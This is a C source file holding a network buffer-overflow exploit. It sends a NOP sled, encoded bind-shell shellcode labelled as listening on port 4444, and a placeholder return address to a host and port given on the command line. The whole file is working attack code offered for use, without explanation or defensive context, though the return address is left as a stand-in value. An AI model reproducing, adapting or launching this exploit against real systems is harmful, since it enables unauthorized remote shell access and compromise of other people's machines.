#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <string.h>
#include <stdlib.h>
#define EIP "\x41\x41\x41\x41"
#define OFFSET 204
#define SIZE 1024
#define SLED 87
char shellcode[] = /*Portbind @ 4444*/ //117
"\xb8\xa3\xca\x56\xdf\xda\xdf\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x17\x83\xc7\x04\x31\x47\x10\x03\x47\x10\x41\x3f\x67\x04\xd6"
"\x83\xdb\xd0\xd2\x8a\x3d\x4e\x84\xd4\x70\x0f\xde\x7c\xd8\x42"
"\x8c\x2c\x8f\x30\x56\xb9\x3e\xe9\xf0\x51\x4b\x11\x75\x40\x21"
"\x0d\xd4\xd5\x3f\xcc\x95\xb3\x59\x57\xd4\xc4\x16\x01\x55\xc0"
"\x9b\x4e\xcb\x9b\x75\xc6\x0a\x58\xca\xbe\x01\xdf\xb9\x66\xf3"
"\xdf\xe5\x55\x83\x69\x6f\x9e\xeb\x46\xa0\x2d\x83\xf0\x91\xb3"
"\x3a\x6f\x67\xd0\xec\x3c\xfe\xf6\xbc\xc8\xcd\x79";

int main(int argc, char *argv[])
{
	if(argc < 3) {
		printf("Usage: %s <Host/IPv6><port>\n", argv[0]);
		return 0;
	}
	int s, retval, noplen, len;
	struct addrinfo Hints, *AddrInfo, *AI;
	char buffer[SIZE],NOP[SLED + 1];
	memset(NOP, 0x90, SLED);
	NOP[SLED] = 0;
	printf("\n");
	printf("%d is NOP len, expected 87\n", strlen(NOP));
	printf("%d is shellcode len, expected 117\n", strlen(shellcode));
	printf("%d is EIP len, expected 4\n", strlen(EIP));
	sprintf(buffer, "%s%s%s", NOP, shellcode, EIP);
	len = strlen(buffer);
	printf("%d is payload len, expected 208\n", len);
	memset(&Hints,0,sizeof(Hints));
	Hints.ai_family = AF_UNSPEC;
	Hints.ai_socktype = SOCK_STREAM;
	retval = getaddrinfo(argv[1],argv[2], &Hints, &AddrInfo);
	if(retval!=0){
		printf("Cannot resolve requested address\n");
		exit(0);
	}
	for(AI=AddrInfo;AI!=NULL;AI=AI->ai_next)
	{
		if((s=socket(AI->ai_family,AI->ai_socktype,AI->ai_protocol)) < 0)
		{
			printf("can't create socket\n");
			exit(0);
		}
		connect(s,AI->ai_addr,AI->ai_addrlen);
		send(s,buffer,len,0);
		printf("SENT [OK]\n");
	}
	freeaddrinfo(AddrInfo);
	return 0;
}